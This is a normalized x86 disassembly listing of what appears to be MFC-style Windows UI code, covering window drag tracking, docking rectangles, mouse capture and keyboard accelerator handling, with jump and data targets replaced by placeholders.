or ah 0x20
push eax
push ecx
push [ ebx + 0x48 ]
mov [ ebx + 0xa4 ] eax
mov [ ebx + 0xac ] ecx
test ah 0xa0
je r-xdata
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push [ eax + 0x1c ]
call [ GetDlgCtrlID@IAT ]
movzx eax ax
cmp eax 0xe81b
jb r-xdata
lea esi [ ebx + 0x28 ]
test ah 0x50
je r-xdata
cmp [ ebx + 0x7c ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
mov ecx [ ebx + 0x6c ]
push eax
push [ ebp - 0x4 ]
push [ ebx + 0x68 ]
call sub_4514c1
mov ebx [ ebx + 0x6c ]
push 0x1
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0xc8 ]
pop edi
pop esi
jmp r-xdata
cmp eax 0xe81e
ja r-xdata
mov eax [ ebx + 0x70 ]
mov ecx [ ebx + 0x58 ]
and eax 0x40
mov [ ebx + 0xa8 ] ecx
mov ecx [ ebx + 0x5c ]
or ah 0x10
push eax
push ecx
push [ ebx + 0x58 ]
mov [ ebx + 0xa4 ] eax
mov [ ebx + 0xac ] ecx
jmp r-xdata
cmp [ ebx + 0x7c ] 0x0
jne r-xdata
pop ebx
leave
retn
mov [ ebx + 0x90 ] eax
lea eax [ ebx + 0x94 ]
lea esi [ ebp - 0x14 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
push eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_44736f
push [ ebx + 0x68 ]
mov ecx [ ebx + 0x6c ]
call sub_45159b
sub_44e79f
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
mov ebx ecx
xor edi edi
mov [ ebx + 0x88 ] edi
call sub_44eb5a
mov ecx [ ebx + 0x84 ]
lea esi [ ebx + 0x84 ]
call sub_4472f3
test al 0x1
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x68 ]
push [ eax + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0x68 ]
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8c ] eax
mov eax [ ecx ]
push 0x6
lea edx [ ebp - 0x8 ]
push edi
push edx
call [ eax + 0xbc ]
mov edx [ ebp - 0x24 ]
mov esi [ ebp - 0x4 ]
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
add esi edx
add ecx eax
mov [ ebp + 0x8 ] esi
mov [ ebp - 0xc ] esi
lea edi [ ebx + 0x28 ]
lea esi [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
push 0x0
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
lea edi [ ebx + 0x38 ]
mov [ ebp - 0xc ] esi
lea esi [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
push 0xc40000
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebx + 0x48 ]
lea esi [ ebp - 0x18 ]
mov edi eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call sub_452cfc
mov eax [ rw-data ]
lea esi [ ebx + 0x48 ]
neg eax
push eax
mov eax [ rw-data ]
neg eax
push eax
push esi
call [ InflateRect@IAT ]
mov edx [ ebx + 0x40 ]
mov eax [ esi + 0x8 ]
mov edi [ ebx + 0x44 ]
mov ecx [ esi + 0xc ]
sub edx [ ebx + 0x38 ]
sub eax [ esi ]
sub edi [ ebx + 0x3c ]
sub ecx [ esi + 0x4 ]
sub eax edx
sub ecx edi
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
lea edi [ ebx + 0x58 ]
lea esi [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] ecx
movsd [ edi ] [ esi ]
push [ ebp + 0x10 ]
and [ ebx + 0x74 ] 0x0
movsd [ edi ] [ esi ]
push [ ebp + 0xc ]
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_44e8e1
mov ecx ebx
call sub_44ef2b
pop edi
pop esi
pop ebx
leave
retn 0xc
mov ecx [ esi ]
push edi
call sub_447329
sub_44e8e1
push ebp
mov ebp esp
sub esp 0x38
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push esi
push 0x2
mov ecx [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
sub eax ecx
mov ecx [ ebp + 0xc ]
sub ecx edx
mov edx [ ebx + 0x8c ]
cmp edx 0xa
pop esi
je r-xdata
add [ ebx + 0x28 ] eax
jmp r-xdata
cmp edx 0xb
je r-xdata
mov eax [ ebx + 0x30 ]
sub eax [ ebx + 0x28 ]
cmp edx 0xa
jne r-xdata
push 0x22
cmp edx 0xc
pop esi
jne r-xdata
mov ecx [ ebx + 0x68 ]
push edi
push esi
push eax
mov edx [ ecx ]
lea eax [ ebp - 0x8 ]
push eax
call [ edx + 0xbc ]
call [ GetDesktopWindow@IAT ]
lea ecx [ ebp - 0x28 ]
push ecx
push eax
call [ GetWindowRect@IAT ]
lea esi [ ebx + 0x48 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x8c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp eax 0xa
pop edi
je r-xdata
xor eax eax
add [ ebx + 0x30 ] eax
add [ ebx + 0x34 ] ecx
add [ ebx + 0x2c ] ecx
jmp r-xdata
mov eax [ ebx + 0x58 ]
sub eax [ ebx + 0x60 ]
sub eax [ ebp - 0x8 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x5c ]
sub eax [ ebx + 0x64 ]
sub eax [ ebp - 0x4 ]
add eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call [ IntersectRect@IAT ]
test eax eax
je r-xdata
cmp eax 0xc
je r-xdata
test eax eax
jge r-xdata
mov eax [ ebx + 0x34 ]
sub eax [ ebx + 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
push 0x0
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx ebx
mov [ ebx + 0x8 ] eax
call sub_44ec64
pop esi
pop ebx
leave
retn 0x8
mov eax [ ebx + 0x40 ]
sub eax [ ebp - 0x8 ]
mov [ ebx + 0x38 ] eax
mov eax [ ebx + 0x44 ]
sub eax [ ebp - 0x4 ]
mov [ ebx + 0x3c ] eax
mov eax [ ebp - 0x18 ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x60 ]
sub eax [ ebx + 0x58 ]
add eax [ ebp - 0x18 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x64 ]
sub eax [ ebx + 0x5c ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call [ IntersectRect@IAT ]
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
add eax [ ebp - 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebx + 0x3c ]
add eax [ ebp - 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebx + 0x50 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x54 ] eax
jmp r-xdata
sub_44ea3e
push ecx
push ecx
push esi
mov esi ecx
call sub_44ec1b
mov edx [ esi + 0x40 ]
mov ecx [ esi + 0x68 ]
sub edx [ esi + 0x38 ]
push 0x42
mov eax [ ecx ]
push edx
lea edx [ esp + 0xc ]
push edx
call [ eax + 0xbc ]
mov eax [ esi + 0x70 ]
mov ecx [ esi + 0x6c ]
and eax 0x40
or ax 0x2004
push eax
push [ esi + 0x4c ]
push [ esi + 0x48 ]
push [ esi + 0x68 ]
call sub_45159b
pop esi
pop ecx
pop ecx
retn
sub_44ea81
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx ecx
mov ecx [ ebx + 0x68 ]
call sub_4513c9
test eax eax
je r-xdata
mov eax [ ebx + 0xa8 ]
mov ecx [ ebx + 0xac ]
test eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
jl r-xdata
mov eax [ ebx + 0x68 ]
test [ eax + 0x69 ] 0xf0
je r-xdata
mov eax [ ebx + 0x94 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x98 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x68 ]
push [ eax + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
lea ecx [ ebp - 0x8 ]
push ecx
push [ eax + 0x1c ]
call [ ClientToScreen@IAT ]
test ecx ecx
jge r-xdata
pop ebx
leave
retn
push esi
push edi
lea esi [ ebx + 0x94 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x90 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor esi esi
test eax eax
je r-xdata
push [ ebx + 0xa4 ]
mov ecx [ ebx + 0x6c ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebx + 0x68 ]
call sub_45159b
mov ecx [ ebx + 0x6c ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebx + 0x68 ]
call sub_451516
mov ecx [ ebx + 0x6c ]
push 0x1
mov eax [ ecx ]
call [ eax + 0xc8 ]
pop edi
pop esi
jmp r-xdata
mov ecx [ ebx + 0x6c ]
push eax
call sub_450b0f
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
call sub_4473ab
sub_44eb5a
sub esp 0x1c
lea eax [ esp ]
push ebx
push ebp
push esi
xor ebx ebx
push edi
push ebx
mov edi [ PeekMessageA@IAT ]
push 0xf
pop ebp
mov esi ecx
push ebp
push ebp
push ebx
push eax
mov eax [ esi + 0x68 ]
mov ecx [ eax + 0x68 ]
mov [ esi + 0x70 ] ecx
mov eax [ eax + 0x64 ]
and eax 0xf000
mov [ esi + 0x78 ] eax
lea eax [ esi + 0xc ]
push eax
call [ SetRectEmpty@IAT ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x7c ] ebx
mov [ esi + 0x80 ] ebx
call [ GetDesktopWindow@IAT ]
push eax
call sub_43e7b3
mov edi eax
push [ edi + 0x1c ]
call [ LockWindowUpdate@IAT ]
test eax eax
je r-xdata
push ebp
push ebp
lea eax [ esp + 0x18 ]
push ebx
push eax
call [ GetMessageA@IAT ]
test eax eax
je r-xdata
push 0x3
push 0x403
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
lea eax [ esp + 0x10 ]
push eax
call [ DispatchMessageA@IAT ]
push ebx
push ebp
push ebp
lea eax [ esp + 0x1c ]
push ebx
push eax
jmp r-xdata
push ebx
push [ edi + 0x1c ]
call [ GetDCEx@IAT ]
push eax
call sub_446c0a
mov [ esi + 0x84 ] eax
call edi
test eax eax
je r-xdata
sub_44ec1b
push esi
push edi
mov esi ecx
push 0x1
call sub_44ec64
call [ ReleaseCapture@IAT ]
call [ GetDesktopWindow@IAT ]
push eax
call sub_43e7b3
push 0x0
mov edi eax
call [ LockWindowUpdate@IAT ]
mov eax [ esi + 0x84 ]
add esi 0x84
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ eax + 0x4 ]
push [ edi + 0x1c ]
call [ ReleaseDC@IAT ]
and [ esi ] 0x0
sub_44ec64
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push 0x1
pop eax
mov ebx ecx
push 0x0
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
call [ GetStockObject@IAT ]
push eax
call sub_44774c
mov esi eax
mov [ ebp - 0xc ] esi
call sub_4518a5
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x74 ]
mov [ ebp - 0x8 ] esi
mov esi 0xa000
test esi eax
je r-xdata
test ah 0x50
je r-xdata
lea esi [ ebx + 0x28 ]
mov edi [ GetSystemMetrics@IAT ]
push 0x20
call edi
dec eax
push 0x21
mov [ ebp - 0x14 ] eax
call edi
dec eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x78 ]
test esi eax
je r-xdata
lea esi [ ebx + 0x38 ]
jmp r-xdata
xor esi esi
cmp [ ebp + 0x8 ] esi
je r-xdata
test ah 0x50
je r-xdata
cmp [ ebx + 0x7c ] 0x0
je r-xdata
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
lea esi [ ebx + 0x58 ]
cmp [ ebx + 0x7c ] 0x0
je r-xdata
lea esi [ ebx + 0x48 ]
jmp r-xdata
cmp [ ebx + 0x24 ] esi
mov eax [ ebp - 0x4 ]
jne r-xdata
test [ ebx + 0x75 ] 0xf0
je r-xdata
lea edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
push eax
lea edi [ ebx + 0xc ]
push [ ebp - 0x8 ]
mov ecx [ ebx + 0x84 ]
lea eax [ ebp - 0x24 ]
push [ ebx + 0x20 ]
push [ ebx + 0x1c ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push eax
call sub_451918
lea esi [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebx + 0x20 ] eax
xor eax eax
cmp [ ebp - 0x8 ] ecx
movsd [ edi ] [ esi ]
sete al
pop edi
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
leave
retn 0x4
mov eax [ ebp - 0xc ]
push 0xffffffff
lea eax [ ebp - 0x24 ]
push 0xffffffff
push eax
call [ InflateRect@IAT ]
sub_44ed7a
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
cmp [ ecx ] eax
je r-xdata
pop esi
retn 0x8
mov [ ecx ] eax
mov eax [ esi + 0x70 ]
test ah 0xa0
je r-xdata
xor eax eax
test ah 0x50
je r-xdata
mov ecx esi
call sub_44edcc
xor eax eax
jmp r-xdata
cmp [ esi + 0x7c ] 0x0
je r-xdata
push 0x0
mov ecx esi
mov [ esi + 0x74 ] eax
call sub_44ec64
push 0x1
pop eax
jmp r-xdata
cmp [ esi + 0x80 ] 0x0
mov [ esi + 0x7c ] eax
je r-xdata
sub_44edcc
push ecx
push ebx
push ebp
mov ebx ecx
push esi
push edi
mov edi 0xa000
mov esi [ ebx + 0x78 ]
xor eax eax
and esi edi
cmp [ ebx + 0x7c ] eax
je r-xdata
cmp esi eax
mov ebp 0xffffafff
je r-xdata
xor ecx ecx
cmp esi eax
sete cl
mov esi ecx
mov ecx [ ebx + 0x70 ]
test ch 0x50
je r-xdata
mov ecx [ ebx + 0x70 ]
test edi ecx
je r-xdata
cmp [ ebx + 0x7c ] 0x0
jne r-xdata
and ch 0x5f
push eax
push ecx
lea esi [ ebx + 0x38 ]
and ecx ebp
push eax
push ecx
lea esi [ ebx + 0x28 ]
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
test eax eax
jne r-xdata
sub esp 0x10
mov ecx [ ebx + 0x6c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_451698
mov ecx [ ebx + 0x70 ]
test ch 0xa0
je r-xdata
mov ecx [ ebx + 0x70 ]
test ch 0x50
je r-xdata
and ecx ebp
push eax
push ecx
lea esi [ ebx + 0x38 ]
sub esp 0x10
mov ecx [ ebx + 0x6c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_451698
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x70 ]
and eax ebp
push 0x0
push eax
lea esi [ ebx + 0x28 ]
sub esp 0x10
mov ecx [ ebx + 0x6c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_451698
mov ecx eax
sub eax [ esp + 0x10 ]
neg eax
sbb eax eax
not eax
and eax ecx
jne r-xdata
mov ebp 0xffff5fff
push 0x0
and ecx ebp
lea esi [ ebx + 0x28 ]
push ecx
mov ecx [ ebx + 0x6c ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_451698
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x70 ]
and eax ebp
push 0x0
push eax
lea esi [ ebx + 0x38 ]
sub esp 0x10
mov ecx [ ebx + 0x6c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_451698
mov ecx eax
sub eax [ esp + 0x10 ]
neg eax
sbb eax eax
not eax
and eax ecx
sub_44eee3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
test ah 0xa0
push edi
je r-xdata
test ah 0x50
je r-xdata
lea edx [ ebp + 0x8 ]
and ah 0xaf
push edx
push eax
lea esi [ ecx + 0x28 ]
jmp r-xdata
xor eax eax
lea edx [ ebp + 0x8 ]
and ah 0x5f
push edx
push eax
lea esi [ ecx + 0x38 ]
sub esp 0x10
mov ecx [ ecx + 0x6c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_451698
mov eax [ ebp + 0x8 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_44ef2b
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ GetCapture@IAT ]
mov esi ecx
call edi
test eax eax
jne r-xdata
xor eax eax
mov eax [ esi + 0x68 ]
push [ eax + 0x1c ]
call [ SetCapture@IAT ]
push eax
call sub_43e7b3
call edi
push eax
call sub_43e7b3
cmp eax [ esi + 0x68 ]
jne r-xdata
mov ecx esi
call sub_44ec1b
xor ebx ebx
push [ ebp - 0x14 ]
call sub_45b297
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax 0x100
je r-xdata
cmp [ esi + 0x88 ] ebx
je r-xdata
dec eax
je r-xdata
cmp [ ebp - 0x14 ] 0x1b
je r-xdata
push 0x1
mov ecx esi
push [ ebp - 0x14 ]
call sub_44e660
cmp [ esi + 0x88 ] ebx
je r-xdata
sub eax 0xff
je r-xdata
call edi
push eax
call sub_43e7b3
cmp eax [ esi + 0x68 ]
je r-xdata
push ebx
mov ecx esi
push [ ebp - 0x14 ]
call sub_44e660
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ esi + 0x88 ] ebx
mov edx [ ebp - 0x4 ]
push ecx
push ecx
mov eax esp
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx esi
je r-xdata
dec eax
dec eax
je r-xdata
push ebx
push ebx
lea eax [ ebp - 0x1c ]
push ebx
push eax
call [ GetMessageA@IAT ]
test eax eax
je r-xdata
call sub_44e8e1
jmp r-xdata
call sub_44e5e4
jmp r-xdata
cmp [ esi + 0x88 ] ebx
mov ecx esi
je r-xdata
dec eax
dec eax
je r-xdata
call sub_44ea3e
call sub_44e694
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
pop eax
jmp r-xdata
sub_44f046
mov eax sub_4635e4
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_43effe
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43ee41
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_44f07e
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x2b
je r-xdata
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xb8 ]
push 0x1
pop eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_440622
jmp r-xdata
pop ebp
retn 0x10
sub_44f0ac
mov eax sub_4635f8
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_43effe
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43ee41
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_44f0ec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x2b
je r-xdata
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xb8 ]
dec eax
je r-xdata
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xbc ]
jmp r-xdata
dec eax
je r-xdata
push 0x1
pop eax
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xc4 ]
jmp r-xdata
sub eax 0xc
je r-xdata
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xc0 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_440622
jmp r-xdata
pop ebp
retn 0x10
sub_44f153
mov eax sub_46360c
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_43effe
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43ee41
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_44f1b3
push esi
mov esi [ GetVersion@IAT ]
push edi
call esi
mov edi 0x80000000
test edi eax
je r-xdata
call esi
test edi eax
jne r-xdata
call esi
cmp ax 0x4
je r-xdata
and [ rw-data ] 0x0
call esi
cmp ax 0x3
jne r-xdata
push r--data
call [ RegisterWindowMessageA@IAT ]
mov [ rw-data ] eax
jmp r-xdata
pop edi
pop esi
retn
sub_44f1fe
mov eax sub_4636ed
call sub_42dc88
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_43e388
xor edi edi
push 0xa
lea ecx [ esi + 0x6c ]
mov [ ebp - 0x4 ] edi
call sub_43cdcd
mov eax [ rw-data ]
mov [ esi + 0xac ] eax
or [ esi + 0x40 ] 0xffffffff
lea eax [ esi + 0x58 ]
push eax
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x3c ] 0x1
mov [ esi + 0x9c ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] edi
mov [ esi + 0x98 ] edi
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0x68 ] edi
mov [ esi + 0xa8 ] edi
mov [ esi + 0xb8 ] edi
call [ SetRectEmpty@IAT ]
or [ esi + 0x88 ] 0xffffffff
mov ecx esi
mov [ esi + 0x50 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0xb0 ] edi
mov [ esi + 0xb4 ] edi
call sub_44f35c
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_44f2dc
mov eax sub_463719
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
call sub_44f380
call sub_453349
cmp [ eax + 0xc4 ] esi
jne r-xdata
mov eax [ esi + 0xa4 ]
test eax eax
je r-xdata
call sub_453349
and [ eax + 0xc4 ] 0x0
lea ecx [ esi + 0xac ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x6c ]
call sub_43ce2c
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43ee41
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push eax
call sub_441eb2
pop ecx
sub_44f3a4
push esi
mov esi ecx
call sub_45357b
push [ esp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call [ LoadAcceleratorsA@IAT ]
xor ecx ecx
mov [ esi + 0x48 ] eax
test eax eax
setne cl
mov eax ecx
pop esi
retn 0x4
sub_44f3ca
mov eax [ ecx ]
push esi
mov esi [ ecx + 0x48 ]
call [ eax + 0xbc ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
mov ecx eax
call [ edx + 0xa8 ]
test eax eax
je r-xdata
mov esi eax
sub_44f3ee
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov eax [ edi + 0x4 ]
cmp eax 0x201
je r-xdata
push [ edi ]
call sub_447a04
cmp eax 0xa1
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
push edi
mov ecx esi
call sub_43f096
test eax eax
jne r-xdata
pop edi
pop esi
retn 0x4
mov eax [ edi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax [ ecx ]
push edi
call [ eax + 0x54 ]
test eax eax
jne r-xdata
xor eax eax
cmp eax 0x108
ja r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xe8 ]
test eax eax
je r-xdata
push edi
push eax
push [ esi + 0x1c ]
call [ TranslateAcceleratorA@IAT ]
test eax eax
je r-xdata
sub_44f48d
push esi
mov esi ecx
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_43e71a
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
push 0x1
pop eax
pop esi
retn
sub_44f4ae
sub esp 0x1c
push ebp
push esi
mov esi ecx
xor ebp ebp
cmp [ esi + 0x50 ] ebp
je r-xdata
pop esi
pop ebp
add esp 0x1c
retn
push ebx
push edi
mov edi 0x367
push 0x3
push edi
push edi
push [ esi + 0x1c ]
lea eax [ esp + 0x20 ]
push eax
call [ PeekMessageA@IAT ]
mov ebx [ PostMessageA@IAT ]
test eax eax
jne r-xdata
call [ GetCapture@IAT ]
cmp eax [ esi + 0x1c ]
jne r-xdata
push ebp
push ebp
push edi
push [ esi + 0x1c ]
call ebx
mov ecx esi
call sub_43fe5b
push ebp
push ebp
mov [ esi + 0x50 ] ebp
push 0x36a
mov [ eax + 0x50 ] ebp
push [ esi + 0x1c ]
call ebx
pop edi
pop ebx
call [ ReleaseCapture@IAT ]
sub_44f519
push esi
mov esi ecx
call sub_43fe5b
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov ecx esi
call sub_43e71a
push [ rw-data ]
call [ SetCursor@IAT ]
push 0x1
pop eax
jmp r-xdata
pop esi
retn 0xc
sub_44f543
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
test esi esi
jne r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_4414d5
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ eax ]
push 0x1
push esi
mov ecx eax
call [ edx + 0x98 ]
mov esi [ edi + 0x8c ]
add esi 0x20000
mov esi [ edi + 0x90 ]
add esi 0x10000
jmp r-xdata
pop edi
pop esi
retn 0x8
xor eax eax
test esi esi
je r-xdata
sub_44f5b1
push ebx
push esi
push edi
mov esi ecx
movzx edi [ esp + 0x10 ]
call sub_43fe5b
xor ecx ecx
cmp [ eax + 0x50 ] ecx
je r-xdata
push [ esp + 0x14 ]
mov ecx esi
push [ esp + 0x14 ]
call sub_43fbf5
cmp [ esp + 0x14 ] ecx
jne r-xdata
cmp edi 0xe146
je r-xdata
mov ebx 0xe147
cmp edi ebx
je r-xdata
cmp edi 0xe145
je r-xdata
add edi 0x10000
push edi
